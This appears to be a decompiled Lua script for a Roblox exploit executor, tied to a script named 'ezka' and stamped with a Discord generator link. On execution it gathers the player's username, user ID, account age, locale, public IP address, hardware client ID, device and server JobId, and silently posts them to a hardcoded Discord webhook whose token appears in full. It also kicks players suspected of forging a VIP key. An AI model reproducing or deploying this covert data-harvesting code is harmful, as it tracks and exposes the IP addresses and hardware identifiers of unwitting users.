-- This file was generated at discord.gg/syncrypt

_G.o9zxciwmx5 = true

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local _ = LocalPlayer.Name
local MembershipType = LocalPlayer.MembershipType
local v9 = tostring(MembershipType)

v9.sub(v9, 21)

local AccountAge = LocalPlayer.AccountAge
local RobloxLocaleId = game.LocalizationService.RobloxLocaleId
local response = game:HttpGet("https://v4.ident.me/")

game:HttpGet("http://ip-api.com/json")

local clientId = game:GetService("RbxAnalyticsService"):GetClientId()
local v14 = "Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")"
local now = os.time()
local readfile_ = readfile
local v17 = (86400 - (now - tonumber(readfile_("ezka/0x7vh3h.txt")))) / 3600
local v18 = math.ceil(v17)
local v19 = v18 < 0 and 0 or v18
local Name = MarketplaceService:GetProductInfo(game.PlaceId).Name
local UserInputService = game:GetService("UserInputService")
local v22 = game:GetService("GuiService"):IsTenFootInterface() and "Console" or (UserInputService.TouchEnabled and "Mobile" or "PC")
local ACTIVE_EZKA_VERSION = _G.ACTIVE_EZKA_VERSION
local u24 = ACTIVE_EZKA_VERSION == nil and "0.0.0" or ACTIVE_EZKA_VERSION
local EZKA_BANNED = _G.EZKA_BANNED
local u26 = EZKA_BANNED == nil and "no data" or EZKA_BANNED
local vipKey = isfolder("ezka/vip_key")
local t1 = {
	ZzhjjmnnmOFC = true,
	wawiIon = true,
	qw1Xxpon = true
}

(function(p1, p2)
	(http_request or (request or (HttpPost or syn.request)))({
		Url = p1,
		Body = p2,
		Method = "POST",
		Headers = {
			["content-type"] = "application/json"
		}
	})
end)("https://discord.com/api/webhooks/1563665867936374824/jA7hBwxZ9GS2wVhNeLljZISVb7AVHaqPG426P7ZosoQ3tl6SnRH03dJ1F2JgsN8Wq7wJ", ((function()
	local v29 = identifyexecutor()
	local v30 = false
	local v31

	if typeof(v19) == "number" then
		local v32 = v19

		v31 = not math.isfinite(v32)
	else
		v31 = (v19 == "inf" or v19 == "infinity") and true or v30
	end

	if u26 ~= nil then
		local v33 = u26

		u26 = tostring(v33)
	end

	if u24 ~= nil then
		local v34 = u24

		u24 = tostring(v34)
	end

	local v35 = ".\u{200B}\u{200B}\u{200B}\u{200B}\u{200B}\n*Script executed by: *`" .. game.Players.LocalPlayer.Name .. "`\n*Script version: *`v" .. u24 .. "`\n\n(Banned = " .. u26 .. ")"

	if v31 then
		v31 = vipKey == true
	end

	if not (v31 and not t1[game.Players.LocalPlayer.Name]) then
		v37 = UserId
		v38 = tostring(v37)
		v39 = DisplayName
		v40 = tostring(v39)
		v41 = AccountAge
		v42 = tostring(v41)
		v43 = AccountAge / 365
		v44 = math.floor(v43)
		v45 = tostring(v44)
		v46 = RobloxLocaleId
		v47 = tostring(v46)
		v48 = os.date
		v49 = tostring(v48("%m/%d/%Y"))
		v50 = os.date
		v51 = Name
		v52 = vipKey
		v53 = v19
		v54 = UserId
		v55 = response
		v56 = clientId
		v57 = v22
		v58 = v14
		v59 = tostring(v51) .. "\n" .. "VIP: " .. tostring(v52) .. "\n" .. "The VIP key expires in: " .. tostring(v53) .. " hours" .. "```\n\n" .. "**Data2:**\n```\n" .. "User Id: " .. tostring(v54) .. "\n" .. "IP: " .. tostring(v55) .. "\n" .. "Hwid: " .. tostring(v56) .. "\n" .. "Executor: " .. tostring(v29) .. "\n" .. "Device: " .. tostring(v57) .. "\n" .. "JobId: " .. tostring(v58) .. "```"

		return HttpService:JSONEncode({
			content = v35,
			embeds = {
				{
					description = "__[Player Info](https://www.roblox.com/users/" .. v38 .. ")__\n" .. "\n" .. "**User:**\n```\n" .. "Display Name: " .. v40 .. "\n" .. "Account Age (in days): " .. v42 .. "\n" .. "Account Age (in years): " .. v45 .. "\n" .. "```\n\n" .. "**Data:**\n```\n" .. "Country: " .. v47 .. "\n" .. "Date: " .. v49 .. "\n" .. "Time: " .. tostring(v50("%X")) .. "\n" .. "Game: " .. v59,
					type = "rich",
					color = tonumber("0x87CEEB")
				}
			}
		})
	end

	v35 = "Possible counterfeiting of a permanent VIP key (" .. DisplayName .. ")\n\n"
	LocalPlayer:Kick("Possible counterfeiting of a permanent VIP key")

	local v36 = UserId
	local v60 = tostring(v36)
	local v61 = DisplayName
	local v62 = tostring(v61)
	local v63 = AccountAge
	local v64 = tostring(v63)
	local v65 = AccountAge / 365
	local v66 = math.floor(v65)
	local v67 = tostring(v66)
	local v68 = RobloxLocaleId
	local v69 = tostring(v68)
	local date = os.date
	local v70 = tostring(date("%m/%d/%Y"))
	local date2 = os.date
	local v71 = Name
	local v72 = vipKey
	local v73 = v19
	local v74 = UserId
	local v75 = response
	local v76 = clientId
	local v77 = v22
	local v78 = v14
	local game_ = tostring(v71) .. "\n" .. "VIP: " .. tostring(v72) .. "\n" .. "The VIP key expires in: " .. tostring(v73) .. " hours" .. "```\n\n" .. "**Data2:**\n```\n" .. "User Id: " .. tostring(v74) .. "\n" .. "IP: " .. tostring(v75) .. "\n" .. "Hwid: " .. tostring(v76) .. "\n" .. "Executor: " .. tostring(v29) .. "\n" .. "Device: " .. tostring(v77) .. "\n" .. "JobId: " .. tostring(v78) .. "```"

	return HttpService:JSONEncode({
		content = v35,
		embeds = {
			{
				description = "__[Player Info](https://www.roblox.com/users/" .. v60 .. ")__\n" .. "\n" .. "**User:**\n```\n" .. "Display Name: " .. v62 .. "\n" .. "Account Age (in days): " .. v64 .. "\n" .. "Account Age (in years): " .. v67 .. "\n" .. "```\n\n" .. "**Data:**\n```\n" .. "Country: " .. v69 .. "\n" .. "Date: " .. v70 .. "\n" .. "Time: " .. tostring(date2("%X")) .. "\n" .. "Game: " .. game_,
				type = "rich",
				color = tonumber("0x87CEEB")
			}
		}
	})
end)()))
